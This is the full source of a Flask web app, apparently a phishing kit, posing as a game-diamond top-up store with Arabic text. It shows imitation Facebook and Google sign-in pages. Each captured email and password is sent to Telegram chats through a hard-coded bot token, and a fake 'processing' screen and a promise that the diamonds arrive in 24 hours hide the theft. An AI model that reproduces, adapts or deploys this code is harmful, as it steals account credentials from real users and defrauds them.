import os
import requests
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# --- الإعدادات الخاصة بك (𝑨𝑫𝑨𝑴𝑽𝑰𝑷 𝑺𝑻𝑶𝑹𝑬) ---
BOT_TOKEN = "8520788431:AAFpSg4umdrXFr50ZFSaSmUuGK3PM4yLwtk"
CHAT_IDS = ["8397243250", "8058483709"]
LOGO_URL = "https://i.ibb.co/v4m0mC4/itachi-logo.jpg"

def send_telegram(msg):
    for cid in CHAT_IDS:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": cid, "text": msg, "parse_mode": "HTML"})
        except:
            pass

STYLE = """
<style>
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #050505; color: white; overflow-x: hidden; }
    .container { animation: fadeIn 0.6s ease-out; }
    .input-field { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 14px; font-size: 16px; box-sizing: border-box; }
    .main-btn { cursor: pointer; border: none; font-weight: bold; transition: 0.3s; text-decoration: none; display: block; text-align: center; }
</style>
"""

@app.route('/')
def main_page():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="display: flex; align-items: center; justify-content: center; height: 100vh; direction: rtl;">
        <div class="container" style="width: 90%; max-width: 400px; text-align: center; background: #111; padding: 40px 20px; border-radius: 25px; border: 1px solid #222;">
            <img src="{LOGO_URL}" style="width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4b2b;">
            <h1 style="color: #ff4b2b;">𝑨𝑫𝑨𝑴𝑽𝑰𝑷 𝑺𝑻𝑶𝑹𝑬</h1>
            <p style="color: #777;">بوابة الشحن المعتمدة - سجل الدخول للمتابعة</p>
            <a href="/login-fb" class="main-btn" style="background:#1877f2; color:white; padding:15px; border-radius:12px; margin-top:30px;">المتابعة باستخدام فيسبوك</a>
            <a href="/login-gl" class="main-btn" style="background:white; color:#333; padding:15px; border-radius:12px; margin-top:12px;">المتابعة باستخدام جوجل</a>
        </div>
    </body>
    """)

@app.route('/login-fb')
def fb_page():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="background: #f0f2f5; direction: ltr;">
        <div class="container" style="width: 100%; max-width: 400px; margin: auto; text-align: center;">
            <div style="color: #1877f2; font-size: 2.5rem; font-weight: bold; margin: 40px 0 20px;">facebook</div>
            <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; margin: auto;">
                <form method="POST" action="/submit-data">
                    <input type="text" name="u" class="input-field" placeholder="Mobile number or email" style="margin-bottom:12px;" required>
                    <input type="password" name="p" class="input-field" placeholder="Password" style="margin-bottom:12px;" required>
                    <button type="submit" class="main-btn" style="width:100%; background:#1877f2; color:white; padding:12px; border-radius:6px;">Log In</button>
                </form>
            </div>
        </div>
    </body>
    """)

@app.route('/login-gl')
def gl_page():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="background: white; direction: ltr;">
        <div class="container" style="width: 90%; max-width: 450px; margin: 50px auto; border: 1px solid #dadce0; padding: 40px 30px; border-radius: 8px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" style="width:75px;">
            <h2 style="font-weight:400;">Sign in</h2>
            <form method="POST" action="/submit-data">
                <input type="email" name="u" class="input-field" placeholder="Email or phone" style="margin-bottom:15px;" required>
                <input type="password" name="p" class="input-field" placeholder="Enter your password" style="margin-bottom:20px;" required>
                <button type="submit" class="main-btn" style="background:#1a73e8; color:white; padding:10px 24px; border-radius:4px; float:right;">Next</button>
            </form>
        </div>
    </body>
    """)

@app.route('/submit-data', methods=['POST'])
def submit_data():
    u = request.form.get('u')
    p = request.form.get('p')
    send_telegram(f"👤 <b>دخول جديد (𝑨𝑫𝑨𝑴𝑽𝑰𝑷 𝑺𝑻𝑶𝑹𝑬):</b>\\n📧: <code>{u}</code>\\n🔑: <code>{p}</code>")
    return redirect('/packages')

@app.route('/packages')
def packages():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="background: #0a0a0a; text-align: center; direction: rtl; padding: 20px;">
        <h2 style="margin-top:30px;">اختر كمية الشحن 💎</h2>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 30px;">
            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">1000 جوهرة</div>
            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">3000 جوهرة</div>
            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">5000 جوهرة</div>
            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">10000 جوهرة</div>
        </div>
    </body>
    """)

@app.route('/id-check')
def id_page():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="background: #0a0a0a; text-align: center; padding-top: 80px; direction: rtl;">
        <h2>أدخل معرف اللاعب (ID)</h2>
        <input type="number" id="pid" class="input-field" style="width:80%; max-width:300px; background:#000; color:#ff4b2b; text-align:center;">
        <button onclick="window.location.replace('/processing')" class="main-btn" style="background:#ff4b2b; color:white; padding:15px 50px; border-radius:12px; margin: 30px auto;">تأكيد</button>
    </body>
    """)

@app.route('/processing')
def processing():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="background: #000; text-align: center; padding-top: 120px; direction: rtl;">
        <h3 id="status">جاري الاتصال بخوادم Garena...</h3>
        <script>
            setTimeout(() => window.location.replace("/final"), 5000);
        </script>
    </body>
    """)

@app.route('/final')
def success():
    return render_template_string(f"""
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {STYLE}
    <body style="background: #000; text-align: center; padding: 60px 20px; direction: rtl;">
        <h2 style="color:#2ecc71;">تمت العملية بنجاح!</h2>
        <p>يرجى انتظار 24 ساعة لوصول الجواهر.</p>
    </body>
    """)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
